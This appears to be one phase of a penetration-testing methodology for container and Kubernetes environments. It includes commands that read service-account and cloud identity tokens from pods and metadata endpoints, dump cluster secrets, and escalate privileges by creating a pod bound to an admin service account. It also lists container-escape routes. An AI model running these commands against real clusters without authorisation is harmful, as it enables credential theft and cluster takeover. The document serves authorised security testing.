## Phase 4: Container & Orchestration

### Gate: container runtime assessed, K8s API tested (if present), registry access checked

**Skip criteria:** If the target has no containers/K8s (pure serverless, VM-only, or PaaS-only), skip this phase entirely. Indicators that Phase 4 applies:
- EKS/GKE/AKS clusters found in Phase 1 or Phase 3
- Container registry (ECR/GCR/ACR) discovered
- Kubernetes-related subdomains or ports (6443, 10250, 2379)
- Docker/containerd references in instance metadata or user data
- Istio/Envoy headers in HTTP responses

**If skipping:** Move directly to Phase 5. Document "No container/orchestration infrastructure identified" in the report.

**Techniques:**

1. **Kubernetes API:**
   ```bash
   # Unauthenticated access
   curl -sk https://<k8s-api>:6443/api/v1/namespaces
   curl -sk https://<k8s-api>:6443/version
   # With token
   kubectl --token=$TOKEN --server=https://<api> get pods -A
   kubectl auth can-i --list
   ```

2. **Container Escape:**
   - Privileged containers (`--privileged`)
   - Host PID/network namespace
   - Mounted Docker socket (`/var/run/docker.sock`)
   - `SYS_ADMIN` capability + cgroup escape
   - Kernel exploits (CVE-2022-0185, CVE-2024-21626)

3. **Registry Access:**
   ```bash
   # ECR
   aws ecr get-login-password | docker login --username AWS --password-stdin <account>.dkr.ecr.<region>.amazonaws.com
   aws ecr describe-repositories
   # GCR
   gcloud container images list --repository=gcr.io/<project>
   # ACR
   az acr repository list --name <registry>
   ```

4. **Service Mesh & Network Policies:**
   - Istio AuthorizationPolicy gaps
   - Missing NetworkPolicies (pod-to-pod unrestricted)
   - Sidecar injection disabled on sensitive namespaces
   - mTLS in PERMISSIVE mode

5. **Secrets in Cluster:**
   ```bash
   kubectl get secrets -A -o json | jq '.items[].data | keys'
   # Mounted secrets in pods
   kubectl exec <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
   # etcd direct access (if exposed)
   etcdctl get / --prefix --keys-only
   ```

6. **RBAC Escalation & Token Theft:**
   ```bash
   # Check what current SA can do
   kubectl auth can-i --list
   kubectl auth can-i create pods
   kubectl auth can-i create clusterrolebindings
   # Escalate via pod creation (mount privileged SA)
   kubectl run pwn --image=alpine --overrides='{"spec":{"serviceAccountName":"admin-sa","containers":[{"name":"pwn","image":"alpine","command":["sleep","3600"]}]}}'
   # EKS IRSA token theft (from inside pod)
   cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token
   # GKE Workload Identity token
   curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
   # Azure Managed Identity
   curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
   ```

7. **Supply Chain:**
   - Image provenance (unsigned images, no admission controller)
   - Helm chart values with secrets
   - CI/CD pipeline credentials in cluster
   - Admission webhook bypass

**Reference:** `references/container-escape.md`, `references/k8s-cluster-attacks.md`

**Cross-reference:** ptest `references/kubernetes-container-attacks.md`, `references/kubernetes-management-tooling.md`

---
